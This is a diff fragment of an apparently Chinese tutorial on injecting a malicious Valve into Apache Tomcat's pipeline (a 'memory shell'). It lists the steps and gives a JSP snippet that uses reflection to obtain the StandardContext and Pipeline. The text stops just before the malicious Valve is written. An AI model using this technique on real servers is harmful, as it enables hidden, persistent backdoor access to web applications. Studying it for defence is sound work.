@@ -130,11 +130,24 @@ public final void invoke(Request request, Response response)
 `host.getPipeline().getFirst().invoke(request, response)`实现调用后续的Valve。
 # 动态台添加Valve
 所以我们的思路如下
+1. 获取`StandardContext`对象
+2. 通过`StandardContext`对象获取`StandardPipeline`
+3. 编写恶意Valve
+4. 通过`StandardPipeline.addValve()`动态添加Valve
 
+## 获取StandardPipeline对象
 
-
-
-
+```jsp
+<%
+    Field reqF = request.getClass().getDeclaredField("request");
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+ 
+    Pipeline pipeline = standardContext.getPipeline();
+%>
+```
+编写恶意
 
 
 
